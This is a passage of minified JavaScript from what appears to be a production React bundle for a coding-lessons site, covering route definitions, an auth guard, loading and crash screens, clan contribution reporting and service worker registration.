Date(Date.UTC(s.getUTCFullYear(),0,4)),i=(r.getUTCDay()+6)%7;r.setUTCDate(r.getUTCDate()-i+3);const o=1+Math.round((s.getTime()-r.getTime())/(7*864e5));return s.getUTCFullYear()+"-W"+String(o).padStart(2,"0")}function WO(e){let t=0;for(let n=0;n<e.length;n++)t=t*31+e.charCodeAt(n)>>>0;return og[t%og.length]}function UO(e){const t=Kb(bi()),n=Mi(e);let s=0,r=0,i=0;for(const[o,a]of n)o===""||o<t||(s+=a.lessons,r+=a.xp,i+=a.flawless);return{lessons:s,xp:r,flawless:i}}function zO(){const e=Za(),t=Er(Rt.clans.reportContribution),n=VO(bi()),s=WO(n).metric,r=UO(e);return w.useEffect(()=>{r[s]>0&&t({lessons:r.lessons,xp:r.xp,flawless:r.flawless}).catch(()=>{})},[r.lessons,r.xp,r.flawless,s,t]),null}function $O(){return p.jsx(Oh,{fallback:null,children:p.jsx(zO,{})})}const HO=w.lazy(()=>Pn(()=>import("./Learn-DxjkvyX1.js"),__vite__mapDeps([0,1]))),QO=w.lazy(()=>Pn(()=>import("./Lesson-DgoRmHUD.js"),__vite__mapDeps([2,3,4,5,1]))),GO=w.lazy(()=>Pn(()=>import("./PlaygroundPage-Csv_W2wD.js"),__vite__mapDeps([6,3,4]))),KO=w.lazy(()=>Pn(()=>import("./Certificate-B0uLMx70.js"),[])),YO=w.lazy(()=>Pn(()=>import("./Portfolio-HbVE44ug.js"),[])),XO=w.lazy(()=>Pn(()=>import("./Projects-BFoxVOaJ.js"),__vite__mapDeps([7,5,3]))),JO=w.lazy(()=>Pn(()=>import("./Leaderboard-CRCBReLE.js"),[])),ZO=w.lazy(()=>Pn(()=>import("./Clans-BMJOF-4A.js"),[]));function nn({children:e}){const{user:t,authReady:n}=Li(),s=en();if(!n)return null;if(!t){const r=encodeURIComponent(s.pathname+s.search);return p.jsx(P1,{to:`/auth?returnTo=${r}`,replace:!0})}return p.jsx(p.Fragment,{children:e})}function eI(){return p.jsxs("div",{className:"min-h-screen",children:[p.jsx(Di,{}),p.jsxs("main",{className:"mx-auto max-w-3xl px-4 py-24 text-center",role:"status","aria-live":"polite",children:[p.jsx("p",{className:"eyebrow",children:"loading"}),p.jsx("p",{className:"mt-3 font-display text-2xl font-semibold text-ink-950",children:"Fetching this page…"}),p.jsx("p",{className:"mt-2 text-sm text-ink-600",children:"Your progress is already here — this page's code is still arriving."})]})]})}function tI({error:e,onRetry:t}){const{title:n,body:s}=Ch(e);return p.jsxs("div",{className:"min-h-screen",children:[p.jsx(Di,{}),p.jsx("main",{className:"mx-auto max-w-xl px-4 py-20",children:p.jsxs("div",{className:"glass glass-edge rounded-2xl border border-paper-200/60 p-8 text-center",children:[p.jsx("p",{className:"text-3xl","aria-hidden":!0,children:"⚠️"}),p.jsx("h1",{className:"mt-3 font-display text-2xl font-semibold text-ink-950",children:n}),p.jsx("p",{className:"mt-3 text-sm leading-relaxed text-ink-600",children:s}),p.jsxs("div",{className:"mt-6 flex flex-wrap items-center justify-center gap-3",children:[p.jsx("button",{type:"button",onClick:t,className:"btn-gold !px-6 !py-2 text-sm",children:"Try this page again"}),p.jsx(Re,{to:"/learn",className:"btn-ghost !px-6 !py-2 text-sm",children:"Back to lessons"})]}),p.jsxs("details",{className:"mt-6 text-left",children:[p.jsx("summary",{className:"cursor-pointer font-mono text-[11px] uppercase tracking-widest text-ink-500",children:"technical details"}),p.jsx("pre",{className:"mt-2 max-h-40 overflow-auto rounded-xl bg-ink-950 p-3 font-mono text-[11px] text-paper-200",children:e.message})]})]})})]})}function nI(){return p.jsxs(F1,{children:[p.jsx(BO,{}),p.jsx($O,{}),p.jsx(Oh,{fallback:(e,t)=>p.jsx(tI,{error:e,onRetry:t}),children:p.jsx(w.Suspense,{fallback:p.jsx(eI,{}),children:p.jsxs(O1,{children:[p.jsx(tt,{path:"/",element:p.jsx(IO,{})}),p.jsx(tt,{path:"/learn",element:p.jsx(nn,{children:p.jsx(HO,{})})}),p.jsx(tt,{path:"/learn/:trackId/:lessonId",element:p.jsx(nn,{children:p.jsx(QO,{})})}),p.jsx(tt,{path:"/playground",element:p.jsx(nn,{children:p.jsx(GO,{})})}),p.jsx(tt,{path:"/certificate/:trackId",element:p.jsx(nn,{children:p.jsx(KO,{})})}),p.jsx(tt,{path:"/projects",element:p.jsx(nn,{children:p.jsx(XO,{})})}),p.jsx(tt,{path:"/portfolio",element:p.jsx(nn,{children:p.jsx(YO,{})})}),p.jsx(tt,{path:"/leaderboard",element:p.jsx(nn,{children:p.jsx(JO,{})})}),p.jsx(tt,{path:"/clans",element:p.jsx(nn,{children:p.jsx(ZO,{})})}),p.jsx(tt,{path:"/auth",element:p.jsx(LO,{})}),p.jsx(tt,{path:"*",element:p.jsx(DO,{})})]})})})]})}class sI extends w.Component{constructor(){super(...arguments);lr(this,"state",{error:null});lr(this,"reloadFromScratch",()=>{try{("caches"in window?caches.keys():Promise.resolve([])).then(s=>Promise.all(s.map(r=>caches.delete(r)))).catch(()=>{}).finally(()=>window.location.reload())}catch{window.location.reload()}})}static getDerivedStateFromError(n){return{error:n}}componentDidCatch(n){console.error("[app-crash]",n)}render(){const{error:n}=this.state;if(!n)return this.props.children;const{title:s,body:r}=Ch(n);return p.jsx("div",{style:{minHeight:"100vh",display:"flex",alignItems:"center",justifyContent:"center",background:"#0a0a0b",color:"#fafafa",fontFamily:"system-ui, sans-serif",padding:24},children:p.jsxs("div",{style:{maxWidth:560,width:"100%",background:"#141416",border:"1px solid #2a2a2e",borderRadius:16,padding:32,textAlign:"center"},children:[p.jsx("div",{style:{fontSize:34,marginBottom:10},"aria-hidden":!0,children:"⚠️"}),p.jsx("h1",{style:{fontSize:19,fontWeight:650,margin:"0 0 8px"},children:s}),p.jsx("p",{style:{color:"#a1a1aa",fontSize:13.5,lineHeight:1.6,margin:0},children:r}),p.jsxs("div",{style:{marginTop:20,display:"flex",gap:10,justifyContent:"center",flexWrap:"wrap"},children:[p.jsx("button",{type:"button",onClick:this.reloadFromScratch,style:{background:"#f5c04e",color:"#131313",border:"none",borderRadius:999,padding:"10px 22px",fontSize:14,fontWeight:650,cursor:"pointer"},children:"Reload the app"}),p.jsx("button",{type:"button",onClick:()=>{window.location.hash="#/learn",window.location.reload()},style:{background:"transparent",color:"#fafafa",border:"1px solid #3f3f46",borderRadius:999,padding:"10px 22px",fontSize:14,fontWeight:600,cursor:"pointer"},children:"Go to lessons"})]}),p.jsxs("details",{style:{marginTop:20,textAlign:"left"},children:[p.jsx("summary",{style:{cursor:"pointer",fontFamily:"ui-monospace, monospace",fontSize:11,letterSpacing:"0.14em",textTransform:"uppercase",color:"#71717a"},children:"technical details"}),p.jsx("pre",{style:{marginTop:10,background:"#0a0a0b",border:"1px solid #2a2a2e",borderRadius:10,padding:"12px 14px",fontSize:12,color:"#fbbf24",whiteSpace:"pre-wrap",wordBreak:"break-word",maxHeight:180,overflow:"auto"},children:n.message})]})]})})}}"serviceWorker"in navigator&&window.addEventListener("load",()=>{navigator.serviceWorker.register("/sw.js").catch(()=>{})});window.addEventListener("unhandledrejection",e=>{console.error("[unhandledrejection]",e.reason)});lc.createRoot(document.getElementById("root")).render(p.jsx(Ut.StrictMode,{children:p.jsx(sI,{children:p.jsx(kq,{children:p.jsx(nI,{})})})}));export{Bb as $,Rr as A,H as B,lI as C,Cn as D,Xn as E,me as F,Lt as G,RI as H,gR as I,Pu as J,pO as K,Re as L,el as M,Di as N,Th as O,PI as P,qi as Q,vt as R,aq as S,Ws as T,uI as U,AI as V,Zb as W,go as X,EI as Y,wi as Z,aI as _,bi as a,YP as a0,dI as a1,SP as a2,It as a3,Oh as a4,TO as a5,zr as a6,Rt as a7,Er as a8,mq as a9,iI as aA,Rh as aa,bO as ab,SO as ac,OI as ad,mI as ae,pI as af,fI as ag,yI as ah,UT as ai,DT as aj,Ys as ak,Pn as al,TI as am,Yb as an,kO as ao,xO as ap,Ah as aq,ls as ar,VO as as,Hq as at,hI as au,vI as av,$q as aw,wo as ax,oI as ay,dx as az,tl as b,Aa as c,fq as d,kI as e,dq as f,bI as g,Mi as h,Li as i,p as j,qI as k,pq as l,L as m,gI as n,wI as o,yq as p,xI as q,w as r,Ni as s,Dt as t,Za as u,$a as v,XP as w,CI as x,SI as y,Vb as z};
